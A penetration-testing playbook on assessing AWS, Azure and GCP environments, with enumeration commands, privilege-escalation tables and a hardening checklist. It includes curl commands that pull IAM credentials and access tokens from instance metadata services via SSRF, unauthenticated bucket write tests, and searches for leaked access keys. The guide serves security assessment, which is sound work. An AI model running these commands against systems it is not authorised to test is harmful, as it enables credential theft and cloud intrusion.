# ☁️ Cloud Security Assessment Guide

A methodology for identifying critical misconfigurations and vulnerabilities across AWS, Azure, and GCP environments.

> [!IMPORTANT]
> Cloud security is 90% misconfiguration, not vulnerabilities. The most common findings are excessive permissions, public storage, and exposed services — not unpatched software.

## 1. Reconnaissance & Asset Discovery

### Passive Discovery (No Auth Required)
```bash
# Enumerate S3 buckets by guessing common names
# Tool: https://github.com/initstring/cloud_enum
cloud_enum -k target-company -k targetcompany -k target_co

# Check SSL certificates for cloud asset subdomains
# Use crt.sh → site:*.s3.amazonaws.com, site:*.blob.core.windows.net

# Identify cloud provider from IP ranges
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://download.microsoft.com/download/7/1/...
# GCP: https://www.gstatic.com/ipranges/goog.json
```

### Subdomain Enumeration for Cloud Assets
```bash
# Common cloud asset subdomains to look for
# storage.target.com → Azure Blob
# assets.target.com → AWS S3 / CloudFront
# api.target.com → API Gateway / App Service
# dev.target.com, staging.target.com → often less hardened

subfinder -d target.com | httpx -title -tech-detect
```

---

## 2. AWS Security Assessment

### Credential Discovery
```bash
# Check for exposed credentials in public repos
# Search GitHub: "AKIA" site:github.com target.com (AWS Access Key prefix)

# Common places to check for leaked creds:
# - .env files, docker-compose.yml, CI/CD configs
# - Hardcoded in JavaScript bundles
# - EC2 instance metadata endpoint (SSRF pivot)
```

### S3 Bucket Security
```bash
# Test for public read access (no creds needed)
aws s3 ls s3://bucket-name --no-sign-request

# Test for public write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# List all buckets (requires valid creds)
aws s3 ls

# Check bucket policies and ACLs
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name
```

### IAM Enumeration (Post-Credential Access)
```bash
# Who am I?
aws sts get-caller-identity

# What policies do I have?
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# Enumerate all IAM users and roles (if permitted)
aws iam list-users
aws iam list-roles

# Check for over-privileged policies
# Tool: https://github.com/nccgroup/ScoutSuite
scout suite --provider aws --report-dir ./aws_audit
```

### EC2 & SSRF → Instance Metadata Service
The IMDSv1 endpoint is accessible from inside EC2 — and via SSRF from vulnerable web apps.
```bash
# From inside EC2 or via SSRF (IMDSv1 — no auth required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token — use to escalate privileges

# IMDSv2 (requires a token — much safer, should always be enforced)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### AWS Privilege Escalation Paths
| Misconfiguration | Escalation |
|-----------------|------------|
| `iam:CreateAccessKey` on another user | Create keys for a higher-privilege user |
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
| `iam:PassRole` + Lambda/EC2 create | Pass a high-privilege role to a new resource you control |
| `sts:AssumeRole` on admin role | Directly assume admin role if trust policy permits |

```bash
# Check for privilege escalation paths automatically
# Tool: https://github.com/RhinoSecurityLabs/aws_escalate
python3 aws_escalate.py --all-users
```

---

## 3. Azure Security Assessment

### Credential & Tenant Discovery
```bash
# Get tenant ID from domain (no auth)
curl https://login.microsoftonline.com/<domain>/.well-known/openid-configuration | jq .token_endpoint

# Enumerate Azure subdomains
python3 cloud_enum.py -k target
# Checks: *.blob.core.windows.net, *.azurewebsites.net, *.vault.azure.net, etc.
```

### Storage Blob (Azure S3 Equivalent)
```bash
# Test for anonymous blob access
# URL format: https://<account>.blob.core.windows.net/<container>/<blob>
curl https://targetcompany.blob.core.windows.net/public/

# List all blobs in a public container
az storage blob list --account-name targetcompany --container-name public --output table --no-auth-required
```

### Azure AD & Resource Enumeration (Post-Credential)
```bash
# Log in via Azure CLI
az login

# Who am I?
az account show

# List all subscriptions
az account list --output table

# List all resource groups
az group list --output table

# List all VMs
az vm list --output table

# List all storage accounts
az storage account list --output table

# Run a comprehensive audit
# Tool: ScoutSuite
scout suite --provider azure --report-dir ./azure_audit
```

### Azure Managed Identity Abuse (SSRF Pivot)
```bash
# From inside an Azure VM or via SSRF in a web app
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
# Returns an access token for Azure Resource Manager — escalate from here
```

---

## 4. GCP Security Assessment

### Metadata Service (SSRF Pivot)
```bash
# From a GCE instance or via SSRF
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
# Returns an access token for the attached service account
```

### Storage Bucket Enumeration
```bash
# Test for public access (no auth)
gsutil ls gs://target-bucket-name

# Check bucket IAM policy
gsutil iam get gs://target-bucket-name
```

### GCP Privilege Escalation
| Misconfiguration | Escalation |
|-----------------|------------|
| `iam.serviceAccountTokenCreator` on a high-privilege SA | Generate tokens for that service account |
| `resourcemanager.organizations.setIamPolicy` | Grant yourself org-level admin |
| `deploymentmanager.deployments.create` | Deploy resources with a high-privilege SA |

---

## 5. Key Hardening Checks — Across All Providers

| Finding | Remediation |
|---------|------------|
| Public storage buckets | Set bucket policies to private; enable bucket-level access logging |
| IMDSv1 enabled (AWS) | Enforce IMDSv2 (`HttpTokens: required`) on all EC2 instances |
| Over-privileged IAM roles | Apply least-privilege; use IAM Access Analyzer |
| No MFA on root/admin accounts | Enforce MFA for all privileged accounts |
| Secrets in env vars / user data | Use dedicated secrets managers (AWS Secrets Manager, Azure Key Vault, GCP Secret Manager) |
| Unrestricted `0.0.0.0/0` security groups | Restrict inbound rules to known IPs; use VPNs for admin access |
| No CloudTrail / Activity Log | Enable audit logging in all regions, store in a central immutable bucket |

---

## 6. Useful Tools

| Tool | Purpose | Link |
|------|---------|------|
| **ScoutSuite** | Multi-cloud audit | github.com/nccgroup/ScoutSuite |
| **Prowler** | AWS/Azure/GCP CIS benchmark checks | github.com/prowler-cloud/prowler |
| **Pacu** | AWS exploitation framework | github.com/RhinoSecurityLabs/pacu |
| **cloud_enum** | Multi-cloud asset discovery | github.com/initstring/cloud_enum |
| **CloudBrute** | Cloud bucket/subdomain brute-force | github.com/0xsha/CloudBrute |
| **Trivy** | Container/IaC misconfiguration scanner | github.com/aquasecurity/trivy |

---
*Return to [SimplySec Playbook](../README.md)*
